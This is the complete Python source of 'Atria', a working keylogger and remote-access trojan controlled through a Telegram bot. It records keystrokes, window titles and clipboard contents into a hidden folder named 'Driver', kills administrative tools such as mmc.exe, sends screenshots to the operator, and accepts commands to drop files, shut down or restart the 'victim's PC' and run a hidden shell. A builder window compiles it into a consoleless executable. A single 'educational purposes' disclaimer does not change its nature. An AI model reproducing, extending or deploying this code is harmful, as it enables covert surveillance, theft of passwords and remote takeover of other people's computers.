import io
import os
import sys
import ctypes
import datetime
import keyboard
import pygetwindow as gw
import threading
import time
import signal
import atexit
import pyperclip
import psutil
import subprocess
import requests
import telebot
import pyautogui
from PIL import Image
from io import BytesIO
from functools import wraps
from PyQt6 import QtWidgets
from PyQt6.QtWidgets import (
    QLabel,
    QLineEdit, 
    QPushButton, 
    QVBoxLayout, 
    QWidget, 
    QApplication, 
    QMessageBox,
)

# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
#                                               [Constants]                                               #
# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #

IS_COMPILED = getattr(sys, 'frozen', False)
BOT_TOKEN_FILE = 'bot_config.txt'
current_directory = os.getcwd()

# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
#                                  [Retry Function on Exception Error]                                    #
# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #

def retry_on_exception(exception_type, retries=3, delay=1):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(retries):
                try:
                    return func(*args, **kwargs)
                except exception_type as e:
                    log_message(f"Error: {e}. Retrying ({attempt + 1}/{retries})...")
                    time.sleep(delay)
            log_message(f"Failed after {retries} retries.")
        return wrapper
    return decorator

# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
#                                 [Resource Path Functions for Config]                                    #
# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #

def get_resource_path():
    if IS_COMPILED:
        return os.path.join(sys._MEIPASS, 'bot_config.txt')
    else:
        return os.path.join(os.path.dirname(os.path.abspath(__file__)), 'bot_config.txt')
    
def load_configuration():
    config_path = get_resource_path()
    if not os.path.exists(config_path):
        log_message("Configuration file not found. Creating default configuration.", 'warning')
        with open(config_path, 'w') as file:
            file.write("bot_token=\n")
            file.write("chat_id=\n")
        return '', ''
    try:
        with open(config_path, 'r') as file:
            config = file.readlines()
            if len(config) < 2:
                return None, None
            bot_token = config[0].strip().split('=')[1]
            chat_id = config[1].strip().split('=')[1]
            return bot_token, chat_id
    except Exception as e:
        log_message(f"Error loading configuration: {e}", 'error')
        return '', ''

# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
#                                      [Keylogger Main Functions]                                         #
# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #

def log_message(message, log_type='keylog'):
    try:
        file_path = session_files['clipboard'] if log_type == 'clipboard' else session_files['log']
        with open(file_path, 'a', encoding='utf-8') as f:
            f.write(f'{message}\n')
    except Exception as e:
        print(f"Error writing to log file: {e}")

# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
#                                  [Telegram Bot Functions & Commands]                                    #
# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #

bot_token, chat_id = load_configuration()

try:
    bot = telebot.TeleBot(bot_token) if bot_token else None
except Exception as e:
    log_message(f"Error initializing bot: {e}", 'error')
    bot = None

@retry_on_exception(requests.RequestException, retries=5, delay=2)
def send_message(message):
    if bot:
        bot.send_message(chat_id, message)

def start_message():
    send_message("Monitoring started!")
    send_message("Thank you for using Atria!")
    send_message("Use this script only for educational purposes!")
    send_message("To list all commands, type /help in the chatbox.")

@retry_on_exception(requests.RequestException, retries=5, delay=2)
@bot.message_handler(commands=['help'])
def send_help(message):
    help_message = (
        "Atria Commands\n"
        "/help - List available commands\n"
        "/screenshot - Capture and send a screenshot\n"
        "/upload - Upload file from victim's PC\n"
        "/download - Download file from victim's PC\n"
        "/shutdown - Execute shutdown to the victim's PC\n"
        "/restart - Execute restart to the victim's PC\n"
        "/shell <command> - Execute commands using a hidden shell"
    )
    bot.send_message(message.chat.id, help_message)

@retry_on_exception(requests.RequestException, retries=5, delay=2)
@bot.message_handler(commands=['screenshot'])
def send_photo(message):
    if bot:
        try:
            screenshot = pyautogui.screenshot()

            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            buffer.seek(0)

            url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
            files = {'photo': ('screenshot.png', buffer, 'image/png')}
            payload = {'chat_id': chat_id}
            requests.post(url, params=payload, files=files)
        except Exception as e:
            log_message(f"Error in send_photo: {e}", 'error')

@retry_on_exception(requests.RequestException, retries=5, delay=2)
@bot.message_handler(commands=['download'])
def download_file(message):
    file_id = message.document.file_id
    file_info = bot.get_file(file_id)
    file_url = f'https://api.telegram.org/file/bot{bot_token}/{file_info.file_path}'
    file_name = message.document.file_name
    with open(file_name, 'wb') as f:
        f.write(requests.get(file_url).content)
    bot.send_message(chat_id, f"File downloaded: {file_name}")

@retry_on_exception(requests.RequestException, retries=5, delay=2)
@bot.message_handler(commands=['shell'])
def shell_command(message):
    global current_directory

    cmd = message.text[7:]

    if cmd.startswith('cd '):
        try:
            new_directory = cmd[3:].strip()
            os.chdir(new_directory)
            current_directory = os.getcwd()
            output = f"Changed directory to {current_directory}"
        except Exception as e:
            output = f"Error: {e}"
    else:
        try:
            output = subprocess.check_output(cmd, shell=True, cwd=current_directory)
            output = output.decode('utf-8')
        except subprocess.CalledProcessError as e:
            output = f"Error: {e.output.decode('utf-8')}"
        except Exception as e:
            output = f"Error: {e}"

    bot.send_message(message.chat.id, output)

# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
#                                 [Continuation of Keylogger Functions]                                   #
# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #

def get_app_dir():
    return os.path.join(os.path.expanduser('~'), 'Documents', 'Driver')

def create_session_files():
    folder_path = get_app_dir()
    try:
        os.makedirs(folder_path, exist_ok=True)
        ctypes.windll.kernel32.SetFileAttributesW(folder_path, 0x02)
    except Exception as e:
        log_message(f"Error creating session files: {e}", 'error')
        sys.exit(1)

    timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    return {
        'log': os.path.join(folder_path, f'keylog_{timestamp}.txt'),
        'clipboard': os.path.join(folder_path, f'clipboard_{timestamp}.txt')
    }

def log_sentence():
    global sentence
    if sentence:
        log_message(f' - {sentence}')
        sentence = ''

def monitor_active_window():
    previous_window = None
    while True:
        try:
            current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            active_window = gw.getActiveWindow()
            if active_window:
                window_title = active_window.title
                if window_title != previous_window:
                    if previous_window is not None:
                        log_sentence()
                    log_message(f'[{current_time}] Active Window: {window_title}')
                    previous_window = window_title
            else:
                log_message(f'[{current_time}] Active Window: No active window')
        except Exception as e:
            log_message(f"Error in monitor_active_window: {e}", 'error')
        time.sleep(0.1)

def on_key_press(event):
    try:
        global sentence
        if event.name == 'enter':
            log_sentence()
        elif event.name == 'space':
            sentence += ' '
        elif len(event.name) == 1:
            sentence += event.name
        elif event.name == 'backspace' and sentence:
            sentence = sentence[:-1]
        else:
            sentence += f'[{event.name}]'
    except Exception as e:
        log_message(f"Error in on_key_press: {e}", 'error')

def monitor_clipboard():
    global previous_clipboard_content
    try:
        while True:
            current_clipboard_content = pyperclip.paste()
            if current_clipboard_content != previous_clipboard_content:
                previous_clipboard_content = current_clipboard_content
                timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                log_message(f'[{timestamp}] Clipboard Content: {current_clipboard_content}', log_type='clipboard')
            time.sleep(1)
    except Exception as e:
        log_message(f"Error in monitor_clipboard: {e}", 'error')
        time.sleep(5)

def finalize_session(signum=None, frame=None):
    try:
        log_sentence()
        log_message('### Keylogger Log - Session End ###')
    except Exception as e:
        log_message(f"Error in finalize_session: {e}", 'error')

# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
#                                    [Monitor Application Functions]                                      #
# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #

def monitor_processes():
    while True:
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] in ['mmc.exe', 'powershell_ise.exe']:
                    try:
                        proc.terminate()
                    except Exception as e:
                        log_message(f"Error terminating {proc.info['name']}: {e}", 'error')
        except Exception as e:
            log_message(f"Error in monitor_processes: {e}", 'error')
        time.sleep(0.1)

# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
#                                        [GUI Layout Functions]                                           #
# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #

class BotConfigGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('Atria Configuration')
        self.setGeometry(100, 100, 300, 200)

        self.config = load_configuration()

        self.token_label = QLabel('Bot Token:')
        self.token_input = QLineEdit(self)
        self.token_input.setText(self.config[0] if self.config[0] else '')
        self.chat_id_label = QLabel('Chat ID:')
        self.chat_id_input = QLineEdit(self)
        self.chat_id_input.setText(self.config[1] if self.config[1] else '')
        self.save_button = QPushButton('Save Configuration', self)
        self.compile_button = QPushButton('Compile Script', self)
        self.save_button.clicked.connect(self.save_configuration)
        self.compile_button.clicked.connect(self.compile_script)

        layout = QVBoxLayout()
        layout.addWidget(self.token_label)
        layout.addWidget(self.token_input)
        layout.addWidget(self.chat_id_label)
        layout.addWidget(self.chat_id_input)
        layout.addWidget(self.save_button)
        layout.addWidget(self.compile_button)
        self.setLayout(layout)

    def save_configuration(self):
        try:
            bot_token = self.token_input.text()
            chat_id = self.chat_id_input.text()

            if bot_token and chat_id:
                config_path = get_resource_path()
                with open(config_path, 'w') as file:
                    file.write(f"bot_token={bot_token}\n")
                    file.write(f"chat_id={chat_id}\n")
                QMessageBox.information(self, 'Success', 'Configuration saved successfully!')
            else:
                QMessageBox.warning(self, 'Warning', 'Bot token and chat ID cannot be empty.')
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Failed to save configuration: {str(e)}')

    def compile_script(self):
        try:
            QMessageBox.information(self, 'Compilation', 'Compilation started. Check the command prompt for logs.')
            self.close()

            subprocess.Popen(
                'start cmd.exe /K pyinstaller --onefile --noconsole --add-data "bot_config.txt;." Atria.py',
                shell=True
            )
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Failed to start compilation: {str(e)}')

# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
#                       [Condition Checker Function if Compiled or Not Compiled]                          #
# ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #

if __name__ == '__main__':
    if not IS_COMPILED:
        app = QApplication(sys.argv)
        window = BotConfigGUI()
        window.show()
        sys.exit(app.exec())
    else:
        session_files = create_session_files()
        sentence = ''
        previous_clipboard_content = ''

        start_message()
        threading.Thread(target=monitor_active_window, daemon=True).start()
        threading.Thread(target=monitor_clipboard, daemon=True).start()
        threading.Thread(target=monitor_processes, daemon=True).start()
        keyboard.on_press(on_key_press)
        signal.signal(signal.SIGINT, finalize_session)
        atexit.register(finalize_session)

        try:
            bot.polling(none_stop=True)
        except Exception as e:
            log_message(f"Error in bot polling: {e}", 'error')

        while True:
            time.sleep(1)
